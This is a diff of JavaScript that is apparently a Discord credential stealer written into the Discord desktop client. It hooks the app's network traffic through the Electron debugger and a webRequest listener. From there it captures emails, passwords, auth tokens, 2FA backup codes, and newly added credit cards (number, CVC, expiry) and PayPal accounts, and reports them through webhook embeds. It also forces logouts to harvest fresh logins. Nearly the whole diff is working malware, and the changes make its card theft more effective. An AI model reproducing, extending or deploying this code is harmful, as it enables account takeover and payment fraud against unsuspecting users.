@@ -43,6 +43,12 @@ const CONFIG = {
             'https://discordapp.com/api/v*/auth/sessions'
         ],
     },
+    payment_filters: {
+        urls: [
+            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
+            'https://api.stripe.com/v*/tokens',
+        ],
+    },
     API: "https://discord.com/api/v9/users/@me",
     badges: {
         Discord_Emloyee: {
@@ -147,16 +153,16 @@ const request = async (method, url, headers, data) => {
 };
 
 const hooker = async (content, token, account) => {
-    if(CONFIG.ping_on_run == true){
+    if (CONFIG.ping_on_run == true) {
         content["content"] = CONFIG.ping_val + " " + content["content"];
     }
-    else{
+    else {
         content["content"] = content["content"];
     }
     content["username"] = CONFIG.embed_name;
     content["avatar_url"] = CONFIG.embed_icon;
     content["embeds"][0]["author"] = {
-        "name": account.username + " | " + account.id,
+        "name": account.username,
     };
     content["embeds"][0]["thumbnail"] = {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
@@ -286,7 +292,7 @@ const getFriends = async token => {
         var badges = getRareBadges(acc.user.public_flags)
         if (badges != "") {
             if (!rareUsers) rareUsers = "**Rare Friends:**\n";
-            rareUsers += `${badges} ${acc.user.username}\n`;
+            rareUsers += `${badges} ${acc.user.username}#${acc.user.discriminator}\n`;
         }
     }
     rareUsers = rareUsers || "**No Rare Friends**";
@@ -440,83 +446,6 @@ const PaypalAdded = async (token) => {
     hooker(content, token, account);
 }
 
-let email = "";
-let password = "";
-const createWindow = () => {
-    mainWindow = BrowserWindow.getAllWindows()[0];
-    if (!mainWindow) return
-
-    mainWindow.webContents.debugger.attach('1.3');
-    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
-        if (method !== 'Network.responseReceived') return;
-        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
-        if (![200, 202].includes(params.response.status)) return;
-
-        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
-            requestId: params.requestId
-        });
-        const responseData = JSON.parse(responseUnparsedData.body);
-
-        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
-            requestId: params.requestId
-        });
-        const requestData = JSON.parse(requestUnparsedData.postData);
-
-        switch (true) {
-            case params.response.url.endsWith('/login'):
-                if (!responseData.token) {
-                    email = requestData.login;
-                    password = requestData.password;
-                    return; // 2FA
-                }
-                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
-                break;
-
-            case params.response.url.endsWith('/register'):
-                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
-                break;
-
-            case params.response.url.endsWith('/totp'):
-                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
-                break;
-
-            case params.response.url.endsWith('/codes-verification'):
-                BackupCodesViewed(responseData.backup_codes, await getToken());
-                break;
-
-            case params.response.url.endsWith('/@me'):
-                if (!requestData.password) return;
-
-                if (requestData.email) {
-                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
-                }
-
-                if (requestData.new_password) {
-                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
-                }
-                break;
-
-            case params.response.url.endsWith('/tokens'):
-                const item = querystring.parse(requestUnparsedData.body);
-                if (!item['card[number]']) return;
-                CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
-                break;
-
-            case params.response.url.endsWith('/paypal_accounts'):
-                PaypalAdded(await getToken());
-                break;
-
-        }
-    });
-
-    mainWindow.webContents.debugger.sendCommand('Network.enable');
-
-    mainWindow.on('closed', () => {
-        createWindow()
-    });
-}
-createWindow();
-
 const discordPath = (function () {
     const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
     let resourcePath;
@@ -620,6 +549,87 @@ async function updateCheck() {
         `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
     );
 }
+
+let email = "";
+let password = "";
+const createWindow = () => {
+    mainWindow = BrowserWindow.getAllWindows()[0];
+    if (!mainWindow) return
+
+    mainWindow.webContents.debugger.attach('1.3');
+    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
+        if (method !== 'Network.responseReceived') return;
+        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
+        if (![200, 202].includes(params.response.status)) return;
+
+        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
+            requestId: params.requestId
+        });
+        const responseData = JSON.parse(responseUnparsedData.body);
+
+        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
+            requestId: params.requestId
+        });
+        const requestData = JSON.parse(requestUnparsedData.postData);
+
+        switch (true) {
+            case params.response.url.endsWith('/login'):
+                if (!responseData.token) {
+                    email = requestData.login;
+                    password = requestData.password;
+                    return; // 2FA
+                }
+                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
+                break;
+
+            case params.response.url.endsWith('/register'):
+                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
+                break;
+
+            case params.response.url.endsWith('/totp'):
+                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
+                break;
+
+            case params.response.url.endsWith('/codes-verification'):
+                BackupCodesViewed(responseData.backup_codes, await getToken());
+                break;
+
+            case params.response.url.endsWith('/@me'):
+                if (!requestData.password) return;
+
+                if (requestData.email) {
+                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
+                }
+
+                if (requestData.new_password) {
+                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
+                }
+                break;
+        }
+    });
+
+    mainWindow.webContents.debugger.sendCommand('Network.enable');
+
+    mainWindow.on('closed', () => {
+        createWindow()
+    });
+}
+createWindow();
+
+session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
+    if (![200, 202].includes(details.statusCode)) return;
+    if (details.method != 'POST') return;
+    switch (true) {
+        case details.url.endsWith('tokens'):
+            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
+            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
+            break;
+
+        case details.url.endsWith('paypal_accounts'):
+            PaypalAdded(await getToken());
+            break;
+    }
+});
 
 session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
     if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
